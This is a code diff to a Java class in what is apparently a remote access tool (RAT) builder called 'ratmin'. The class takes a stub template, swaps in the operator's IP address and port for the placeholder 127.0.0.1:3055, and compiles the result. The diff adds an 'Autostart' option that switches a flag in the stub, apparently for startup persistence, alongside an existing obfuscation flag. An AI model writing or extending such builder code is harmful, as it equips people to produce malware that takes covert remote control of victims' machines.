@@ -1,23 +1,18 @@
 package me.slimig.ratmin.utils;
 
-import java.io.BufferedReader;
-import java.io.FileOutputStream;
-import java.io.FileReader;
-import java.io.IOException;
-import java.io.InputStream;
+import me.slimig.ratmin.user_interface.Ratmin;
+
+import javax.tools.JavaCompiler;
+import javax.tools.ToolProvider;
+import java.io.*;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 
-import javax.tools.JavaCompiler;
-import javax.tools.ToolProvider;
-
-import me.slimig.ratmin.user_interface.Ratmin;
-
 public class ClassEditor {
 
-    public static void replaceSelected(String ip, String port, String filename, boolean Obfuscate) {
+    public static void replaceSelected(String iptoreplace, String porttoreplce, String filename, boolean Obfuscate, boolean Autostart) {
         InputStream classfile = Ratmin.class.getResourceAsStream("/resources/DummyStub.txt");
         InputStream toolsfile = Ratmin.class.getResourceAsStream("/resources/tools.jar");
         Path classpath = Paths.get("DummyStub.java").toAbsolutePath();
@@ -29,7 +24,7 @@ public class ClassEditor {
         } catch (IOException e1) {
             e1.printStackTrace();
         }
-        String[] filenames = { "DummyStub.java" };
+        String[] filenames = {"DummyStub.java"};
 
         try {
             FileOutputStream errorStream = new FileOutputStream("Errors.txt");
@@ -51,8 +46,11 @@ public class ClassEditor {
 
             // this if structure determines whether or not to replace "0" or "1"
 
-            inputStr = inputStr.replace("127.0.0.1", ip);
-            inputStr = inputStr.replace("3055", port);
+            inputStr = inputStr.replace("127.0.0.1", iptoreplace);
+            inputStr = inputStr.replace("3055", porttoreplce);
+            if (Autostart == true) {
+                inputStr = inputStr.replace("private static boolean as = false;", "private static boolean as = true;");
+            }
 
             // check if the new input is right
             // Debug System.out.println("----------------------------------\n" + inputStr);
@@ -82,6 +80,5 @@ public class ClassEditor {
         }
     }
 
-    // TODO method : replaceSelected("Do the dishes", "1");
 
 }
